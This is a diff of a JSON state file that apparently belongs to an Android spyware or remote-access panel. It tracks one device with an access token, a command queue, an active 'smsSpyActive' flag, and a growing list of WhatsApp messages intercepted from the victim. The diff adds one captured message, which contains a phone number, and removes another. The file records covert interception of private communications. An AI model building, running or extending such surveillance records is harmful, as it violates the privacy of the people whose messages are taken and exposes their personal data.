@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178108870,
+    "lastSeen": 1777178117737,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (24 pesan): ~ hanma back era",
+        "content": "@⁨+62 858-8287-1385⁩",
+        "time": "26/04 12:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178118414
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (23 pesan): ~ hanma back era",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173217988
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (135 pesan): ~ Education",
-        "content": "Saya pemilik sebuah pabrik. Saya menginginkan seorang gadis yang cantik dan setia. Saya memiliki pabrik farmasi sendiri. Saya adalah CEO pabrik tersebut.",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173217717
       }
     ],
     "galleryPhotos": [],
